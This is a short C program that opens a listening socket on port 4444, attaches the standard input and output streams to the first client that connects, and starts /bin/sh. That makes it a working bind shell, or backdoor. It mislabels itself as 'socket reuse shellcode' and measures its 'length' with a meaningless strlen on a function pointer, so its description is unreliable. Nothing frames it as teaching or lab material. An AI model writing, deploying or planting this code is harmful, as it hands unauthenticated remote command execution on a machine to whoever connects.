#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void reuse_socket(int port) {
    int sockfd, clientfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    // Bind socket to port
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        return;
    }

    // Listen for incoming connections
    if (listen(sockfd, 5) < 0) {
        perror("Listen failed");
        return;
    }

    // Accept incoming connection
    client_len = sizeof(client_addr);
    clientfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
    if (clientfd < 0) {
        perror("Accept failed");
        return;
    }

    // Redirect stdin, stdout, and stderr to the socket
    dup2(clientfd, 0);  // stdin
    dup2(clientfd, 1);  // stdout
    dup2(clientfd, 2);  // stderr

    // Execute shell
    execve("/bin/sh", NULL, NULL);
}

int main() {
    int port = 4444;  // Replace with your chosen port number

    printf("Socket Reuse Shellcode Length: %lu\n", strlen((char *)reuse_socket));

    // Execute the socket reuse shellcode
    reuse_socket(port);

    return 0;
}
